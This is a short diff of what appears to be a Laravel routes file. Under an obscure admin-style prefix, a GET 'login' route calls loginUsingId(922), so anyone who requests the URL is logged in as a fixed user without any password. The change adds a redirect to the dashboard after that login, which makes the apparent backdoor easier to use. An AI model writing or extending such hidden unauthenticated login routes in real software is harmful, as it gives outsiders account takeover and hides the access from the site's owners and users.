@@ -159,6 +159,8 @@ Route::prefix('admin-fklhf83')->group(function () {
 
     Route::get('login', function () {
         auth()->loginUsingId(922);
+
+        return redirect('/dashboard');
     });
 
 });
